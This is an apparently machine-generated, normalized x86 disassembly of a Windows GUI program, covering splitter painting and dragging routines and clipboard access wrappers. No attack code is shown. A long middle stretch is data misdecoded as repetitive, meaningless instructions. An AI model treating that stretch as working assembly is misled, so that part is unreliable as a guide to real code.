push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_42affc
mov edx eax
mov eax esi
call sub_423c68
sub_435c7c
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_419174
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_435ce8
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_4507d8
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_403254
xor eax eax
mov [ ebx + 0x170 ] eax
sub_435d30
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_419174
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_44d4d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_449958
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_435e1c
push ebx
mov ebx eax
mov eax ebx
call sub_4493c4
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_44a1c4
mov dx 0xfff1
mov eax ebx
call sub_44a1c4
jmp r-xdata
pop ebx
retn
sub_435e58
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423c94
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_4240b4
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_423a90
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_423a74
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_423994
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_423db0
mov eax ebx
call sub_4499bc
push eax
mov eax ebx
call sub_449a00
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_4241f0
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_422fe8
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424598
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_422fe8
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424598
push eax
call FrameRect
push esi
call DeleteObject
sub_435fb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_435fe4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_436010
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b580
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_435d30
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_419174
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_449a00
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4499bc
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_436520
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_43640c
mov eax ebx
call sub_435c00
mov eax ebx
call sub_461df0
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_435c7c
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44d494
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44d494
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_4361b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_449798
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d038
xor edx edx
push ebp
push sub_4362f0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_44974c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_449798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d040
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_449774
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d038
xor edx edx
push ebp
push sub_436283
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_449728
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_449774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d040
retn
jmp r-xdata
sub_436338
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_436424
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b838
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_436338
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_435c7c
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4361b4
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_435c7c
sub al 0x2
jne r-xdata
sub_4364cc
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_44b8e0
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_435c7c
sub al 0x2
jne r-xdata
mov eax esi
call sub_4361b4
mov eax esi
mov si 0xffc7
call sub_403450
sub_436520
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403450
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_436568
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_435ce8
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_435c7c
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_4365d8
push 0x1004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh ch
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add al bl
cli
dec eax
add [ eax + 0x67 ] cl
inc ebx
add al dl
cli
dec eax
add [ eax + 0x67 ] al
inc ebx
add al cl
cli
dec eax
add [ eax ] bh
inc ebx
add al al
cli
dec eax
add [ eax ] dh
inc ebx
add [ eax + 0x280048fa ] bh
inc ebx
add [ eax + 0x200048fa ] dh
inc ebx
add [ eax + 0x180048fa ] ch
inc ebx
add [ eax + 0x100048fa ] ah
inc ebx
add [ eax + 0x80048fa ] bl
inc ebx
add [ eax + 0x48fa ] dl
inc ebx
add [ eax - 0x7ffb706 ] cl
inc bx
add [ eax - 0xfffb706 ] al
inc bx
add [ eax - 0x6 ] bh
dec eax
add al ch
inc bx
add [ eax - 0x6 ] dh
dec eax
add al ah
inc bx
add [ eax - 0x6 ] ch
dec eax
add al bl
inc bx
add [ eax - 0x6 ] ah
dec eax
add al dl
inc bx
add [ eax - 0x6 ] bl
dec eax
add al cl
inc bx
add [ eax - 0x6 ] dl
dec eax
add al al
inc bx
add [ eax - 0x6 ] cl
dec eax
add [ eax + 0x40004366 ] bh
cli
dec eax
add [ eax + 0x38004366 ] dh
cli
dec eax
add [ eax + 0x30004366 ] ch
cli
dec eax
add [ eax + 0x28004366 ] ah
cli
dec eax
add [ eax + 0x20004366 ] bl
cli
dec eax
add [ eax + 0x18004366 ] dl
cli
dec eax
add [ eax + 0x10004366 ] cl
cli
dec eax
add [ eax + 0x8004366 ] al
cli
dec eax
add [ eax + 0x66 ] bh
inc ebx
add [ eax ] al
cli
dec eax
add [ eax + 0x66 ] dh
inc ebx
add al bh
stc
dec eax
add [ eax + 0x66 ] ch
inc ebx
add al dh
stc
dec eax
add [ eax + 0x66 ] ah
inc ebx
add al ch
stc
dec eax
add [ eax + 0x66 ] bl
inc ebx
add al ah
stc
dec eax
add [ eax + 0x66 ] dl
inc ebx
add al bl
stc
dec eax
add [ eax + 0x66 ] cl
inc ebx
add al dl
stc
dec eax
add [ eax + 0x66 ] al
inc ebx
add al cl
stc
dec eax
add [ eax ] bh
inc bx
add al al
stc
dec eax
add [ eax ] dh
inc bx
add [ eax + 0x280048f9 ] bh
inc bx
add [ eax + 0x200048f9 ] dh
inc bx
add [ eax + 0x180048f9 ] ch
inc bx
add [ eax + 0x100048f9 ] ah
inc bx
add [ eax + 0x80048f9 ] bl
inc bx
add [ eax + 0x48f9 ] dl
inc bx
add [ eax - 0x7ffb707 ] cl
inc ebx
add [ eax - 0xfffb707 ] al
inc ebx
add [ eax - 0x7 ] bh
dec eax
add al ch
inc ebx
add [ eax - 0x7 ] dh
dec eax
add al ah
inc ebx
add [ eax - 0x7 ] ch
dec eax
add al bl
inc ebx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_436908
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43690f
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a58
sub_436944
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436970
retn
sub_436a74
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_4211c4
sub_436aa0
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_436ef4
call sub_421110
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_436afc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_436b1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_436b8e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403fa4
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_40419c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b95
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_436b9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_436c3e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_426a2c
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_42693c
call sub_403a8c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436c4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_436ca4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436cab
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_436cb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_436d09
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436d10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_436d18
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_436b9c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_436c4c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41acac
mov edx ebx
mov eax esi
call sub_436cb4
jmp r-xdata
pop esi
pop ebx
retn
sub_436d80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_436df5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436a58
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_426a00
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436dfc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_436e04
push ebp
